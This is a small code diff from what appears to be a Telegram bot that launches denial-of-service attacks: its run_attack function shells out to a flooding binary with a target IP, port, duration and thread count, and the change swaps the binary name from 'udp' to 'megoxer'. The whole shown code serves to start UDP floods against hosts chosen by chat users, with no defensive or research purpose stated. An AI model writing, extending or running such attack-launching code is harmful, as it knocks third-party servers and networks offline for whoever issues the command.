@@ -38,7 +38,7 @@ async def run_attack(chat_id, ip, port, duration):
     global attack_in_progress
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./udp {ip} {port} {duration} 900",
+            f"./megoxer {ip} {port} {duration} 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
